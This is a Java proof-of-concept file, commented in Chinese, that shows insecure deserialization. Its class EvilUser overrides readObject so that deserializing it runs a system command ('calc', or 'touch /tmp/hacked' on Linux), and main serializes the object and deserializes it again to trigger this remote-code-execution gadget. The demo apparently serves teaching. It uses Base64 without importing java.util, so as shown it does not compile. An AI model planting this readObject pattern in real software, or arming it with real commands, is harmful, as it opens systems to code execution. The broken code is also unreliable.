import java.io.*;

public class EvilUser implements Serializable {
    private static final long serialVersionUID = 1L;
    
    private String username;
    private String password;

    public EvilUser(String username, String password) {
        this.username = username;
        this.password = password;
    }

    // 在反序列化时执行恶意代码
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 触发 RCE（Windows 弹计算器）
        Runtime.getRuntime().exec("calc");
        // 如果是 Linux，改为：Runtime.getRuntime().exec("touch /tmp/hacked");
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 1. 序列化 EvilUser 对象
        EvilUser evilUser = new EvilUser("attacker", "password123");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(evilUser);
        objectOutputStream.close();

        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Serialized EvilUser (Base64): " + Base64.getEncoder().encodeToString(serializedData));

        // 2. 反序列化 EvilUser 对象，触发漏洞
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject(); // 这里会调用 readObject()，触发 RCE
    }
}
